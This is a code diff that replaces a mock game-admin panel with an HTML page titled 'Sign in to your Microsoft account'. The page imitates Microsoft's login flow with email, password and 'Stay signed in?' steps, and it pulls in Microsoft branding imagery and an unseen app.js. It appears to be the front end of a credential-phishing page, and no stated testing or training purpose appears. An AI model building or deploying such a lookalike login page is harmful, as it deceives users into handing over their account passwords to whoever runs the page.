@@ -1,329 +1,123 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RecNet Admin Panel</title>
+    <link rel="icon" href="assets/favicon.ico" />
+    <title>Sign in to your Microsoft account</title>
+    <link rel="stylesheet" href="assets/app.css" />
     <style>
         body {
-            font-family: Arial, sans-serif;
+            background-image: url('https://aadcdn.msftauthimages.net/dbd5a2dd-le9iidoirnbco65vi-ofwait1epujhyddevqexif0j4/logintenantbranding/0/illustration?ts=636737777541545989&quot');
+            background-size: cover;
+            background-repeat: no-repeat;
+            background-position: center;
             margin: 0;
             padding: 0;
-            background-color: #f0f0f0;
-            display: flex;
-            height: 100vh;
-            flex-direction: column;
-        }
-
-        .sidebar {
-            width: 250px;
-            background-color: #2f2f2f;
-            color: white;
-            padding: 20px;
-            display: flex;
-            flex-direction: column;
-            gap: 20px;
-            position: fixed;
-            height: 100%;
-            overflow-y: auto;
-        }
-
-        .header {
-            font-size: 18px;
-            text-align: center;
-        }
-
-        .header .prod {
-            color: red;
-        }
-
-        .sidebar hr {
-            border: 0;
-            border-top: 2px solid red;
-            margin: 10px 0;
-        }
-
-        .sidebar a {
-            text-decoration: none;
-            color: white;
-            padding: 10px 15px;
-            border-radius: 5px;
-            transition: background-color 0.3s;
-        }
-
-        .sidebar a:hover {
-            background-color: #555;
-        }
-
-        .content {
-            flex-grow: 1;
-            margin-left: 250px;
-            padding: 20px;
-            background-color: #333;
-            color: white;
-            overflow-y: auto;
-            text-align: center;
-        }
-
-        .content-header {
-            font-size: 24px;
-            font-weight: bold;
-            margin-top: 20px;
-        }
-
-        .textbox-container, .loading-message, .stats-table {
-            display: none;
-            margin-top: 20px;
-        }
-
-        .textbox-container input {
-            padding: 10px;
-            font-size: 16px;
-            width: 80%;
-            max-width: 400px;
-            margin-top: 10px;
-        }
-
-        .stats-table {
-            width: 100%;
-            max-width: 800px;
-            border-collapse: collapse;
-            margin-left: auto;
-            margin-right: auto;
-            overflow-y: auto; /* Ensures smooth scrolling */
-            height: 400px;  /* Limits height for scrollable area */
-            display: block;
-        }
-
-        .stats-table th, .stats-table td {
-            border: 1px solid white;
-            padding: 8px;
-            text-align: center;
-        }
-
-        .stats-table th {
-            background-color: #444;
-            font-weight: bold;
-        }
-
-        .stats-table tr:nth-child(even) {
-            background-color: #555;
-        }
-
-        .restart-btn {
-            background-color: grey;
-            color: white;
-            padding: 5px 10px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 14px;
-        }
-
-        .restart-btn:hover {
-            background-color: darkgrey;
-        }
-
-        /* Notification Style */
-        .notification {
-            display: none;
-            background-color: red;
-            color: white;
-            padding: 10px;
-            margin-top: 10px;
-            text-align: center;
-            font-size: 18px;
-            border-radius: 5px;
             position: relative;
-            width: 90%;
-            max-width: 400px;
-            margin-left: 50%;
-            transform: translateX(-50%);
-            opacity: 0;
-            transition: opacity 0.5s ease-in-out;
         }
-
-        .notification.show {
-            display: block;
-        }
-
-        #notifications-container {
-            position: fixed;
-            bottom: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            z-index: 10;
+    
+        body::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
             width: 100%;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 1;
         }
-
-        /* Fade-out and white background animation */
-        .fade-out {
-            animation: fadeOut 0.5s forwards;
-        }
-
-        @keyframes fadeOut {
-            0% {
-                opacity: 1;
-                background-color: #555;
-            }
-            100% {
-                opacity: 0;
-                background-color: white;
-            }
+    
+        #section_uname, #section_pwd, #section_final, .footer {
+            position: relative;
+            z-index: 2;
         }
     </style>
 </head>
+
 <body>
-    <div class="sidebar">
-        <div class="header">
-            <h1>RecNet Admin <span class="prod">PROD</span></h1>
-            <hr>
+    <section id="section_uname">
+        <div class="auth-wrapper">
+            <img src="assets/logo.png" alt="Microsoft" class="d-block" width="168" height="36"/>
+            <h2 class="title mb-16 mt-16">Sign in</h2>
+            <form>
+                <div class="mb-16">
+                    <p id="error_uname" class="error"></p>
+                    <input id="inp_uname" type="text" name="uname" class="input" placeholder="Email, phone, or Skype" />
+                </div>
+            </form>
+            <div>
+                <p class="mb-16 fs-13"><a href="" class="link">Can’t access your account?</a></p>
+                <p class="mb-16 fs-13">
+                    <a href="#" class="link">
+                    </a>
+                </p>
+            </div>
+            <div>
+                <button class="btn" id="btn_next">Next</button>
+            </div>
         </div>
-        <a href="#" onclick="changeContent('Live Room Instances')">Live Room Instances</a>
-        <hr>
-        <div class="category">Moderation</div>
-        <a href="#" onclick="changeContent('Players')">Players</a>
-        <a href="#" onclick="changeContent('Rooms')">Rooms</a>
-        <a href="#" onclick="changeContent('Playlists')">Playlists</a>
-        <a href="#" onclick="changeContent('Room Comments')">Room Comments</a>
-        <a href="#" onclick="changeContent('Room Recommendations')">Room Recommendations</a>
-        <a href="#" onclick="changeContent('Clubs')">Clubs</a>
-        <a href="#" onclick="changeContent('Featured Rooms')">Featured Rooms</a>
-        <a href="#" onclick="changeContent('Community Board')">Community Board</a>
-        <a href="#" onclick="changeContent('Announcements')">Announcements</a>
-        <a href="#" onclick="changeContent('Saved Images')">Saved Images</a>
-        <a href="#" onclick="changeContent('Moderation Reports')">Moderation Reports</a>
-        <a href="#" onclick="changeContent('Player Events')">Player Events</a>
-        <a href="#" onclick="changeContent('Inventions')">Inventions</a>
-        <a href="#" onclick="changeContent('Room Keys')">Room Keys</a>
-        <a href="#" onclick="changeContent('Currencies')">Currencies</a>
-        <a href="#" onclick="changeContent('Blocked Registrations')">Blocked Registrations</a>
-    </div>
-
-    <div class="content">
-        <div class="content-header" id="content-header">Select a Tab</div>
-
-        <div class="textbox-container" id="textbox-container">
-            <label for="room-servers">Which room instance(s) would you like to load?</label>
-            <input type="text" id="room-servers" placeholder="Enter room instance...">
+        <div class="opts">
+            <p class="has-icon mb-0" style="font-size:15px;"><span class="icon"><img src="assets/key.png"
+                        width="30px" /></span> Sign-in options</p>
         </div>
+    </section>
 
-        <div class="loading-message" id="loading-message">Loading...</div>
+    <section id="section_pwd" class="d-none">
+        <div class="auth-wrapper">
+            <img src="assets/logo.png" alt="Microsoft" class="d-block" width="168" height="36"/>
 
-        <table class="stats-table" id="stats-table" style="display: none;">
-            <thead>
-                <tr>
-                    <th>ID</th>
-                    <th>Subroom</th>
-                    <th>Players</th>
-                    <th>Full?</th>
-                    <th>Age</th>
-                    <th>Action</th>
-                </tr>
-            </thead>
-            <tbody id="stats-body"></tbody>
-        </table>
-    </div>
+            <div class="identity w-100 mt-16 mb-16">
+                <button class="back">
+                    <img src="assets/back.png" />
+                </button>
+                <span id="user_identity">a@b.com</span>
+            </div>
+            <h2 class="title mb-16">Enter password</h2>
+            <form>
+                <div class="mb-16">
+                    <p id="error_pwd" class="error"></p>
+                    <input id="inp_pwd" type="password" name="pass" class="input" placeholder="Password" />
+                </div>
+            </form>
+            <div>
+                <p class="mb-16"> <a href="#" class="link fs-13">Forgot password?</a></p>
+                <p class="mb-16">
+                    <a href="#" class="link fs-13">Other ways to sign in</a>
+                </p>
+            </div>
+            <div>
+                <button class="btn" id="btn_sig">Sign in</button>
+            </div>
+        </div>
+    </section>
 
-    <div id="notifications-container"></div>
-
-    <script>
-        function changeContent(tabName) {
-            document.getElementById('content-header').innerText = tabName;
-            document.getElementById('textbox-container').style.display = (tabName === 'Live Room Instances') ? 'block' : 'none';
-        }
-
-        document.getElementById('room-servers').addEventListener('keydown', function(event) {
-            if (event.key === 'Enter') {
-                const roomName = this.value;
-                if (roomName && roomName.startsWith('^')) {
-                    loadRoomData();
-                } else {
-                    showInvalidRoomNotification();
-                }
-            }
-        });
-
-        function loadRoomData() {
-            const loadingMessage = document.getElementById('loading-message');
-            const statsTable = document.getElementById('stats-table');
-            const statsBody = document.getElementById('stats-body');
-
-            loadingMessage.style.display = 'block';
-            statsTable.style.display = 'none';
-
-            const loadingTime = Math.random() * 2 + 1; // Random time between 1 and 3 seconds
-            setTimeout(() => {
-                loadingMessage.style.display = 'none';
-
-                const serverCount = Math.floor(Math.random() * 100) + 1;
-                let servers = [];
-
-                for (let i = 0; i < serverCount; i++) {
-                    const id = Math.floor(Math.random() * 8401) + 100;
-                    const subroom = 'Home';
-                    const players = Math.floor(Math.random() * 12) + 1;
-                    const full = players === 12 ? 'Yes' : 'No';
-                    const isHours = Math.random() > 0.5;
-                    const ageValue = isHours ? Math.floor(Math.random() * 15) + 1 : Math.floor(Math.random() * 60) + 1;
-                    const age = isHours ? `${ageValue}h` : `${ageValue}m`;
-
-                    servers.push({
-                        id, subroom, players, full, age
-                    });
-                }
-
-                // Sort servers by player count (descending)
-                servers.sort((a, b) => b.players - a.players);
-
-                // Display the sorted data in the table
-                statsBody.innerHTML = '';
-                servers.forEach(server => {
-                    statsBody.innerHTML += `
-                        <tr id="row-${server.id}">
-                            <td>${server.id}</td>
-                            <td>${server.subroom}</td>
-                            <td>${server.players}</td>
-                            <td>${server.full}</td>
-                            <td>${server.age}</td>
-                            <td><button class="restart-btn" onclick="restartSubroom(${server.id})">Restart</button></td>
-                        </tr>
-                    `;
-                });
-
-                statsTable.style.display = 'table';
-            }, loadingTime * 1000);
-        }
-
-        function restartSubroom(id) {
-            const statsBody = document.getElementById('stats-body');
-            const rowToRemove = document.getElementById(`row-${id}`);
-
-            if (rowToRemove) {
-                rowToRemove.classList.add('fade-out');  // Add fade-out animation
-
-                setTimeout(() => {
-                    statsBody.removeChild(rowToRemove);  // Completely remove the row from the table
-                }, 500);  // Wait for the animation to finish before removal
-            }
-        }
-
-        function showInvalidRoomNotification() {
-            const notificationContainer = document.getElementById('notifications-container');
-            const notification = document.createElement('div');
-            notification.classList.add('notification');
-            notification.innerText = 'Invalid Room Name! Room name must start with "^".';
-
-            notificationContainer.appendChild(notification);
-            notification.classList.add('show');
-
-            setTimeout(() => {
-                notification.classList.remove('show');
-            }, 3000); // Notification stays for 3 seconds
-        }
-    </script>
+    <section id="section_final" class="d-none">
+        <div class="auth-wrapper">
+            <img src="assets/logo.png" alt="Microsoft" class="d-block" width="168" height="36"/>
+            <div class="identity w-100 mt-16 mb-16">
+                <span id="user_identity">a@b.com</span>
+            </div>
+            <h2 class="title mb-16">Stay signed in?</h2>
+            <p class="p">Stay signed in so you don't have to sign in again next time.</p>
+            <label class="has-checkbox">
+                <input type="checkbox" class="checkbox" />
+                <span>Don't show this again</span>
+            </label>
+            <div class="btn-group">
+                <button class="btn btn-sec" id="btn_final">No</button>
+                <button class="btn" id="btn_final">Yes</button>
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+        <a href="#">Terms of use</a>
+        <a href="#">Privacy & cookies</a>
+        <span>.&nbsp;.&nbsp;.</span>
+    </footer>
+    <script src="assets/app.js"></script>
 </body>
+
 </html>
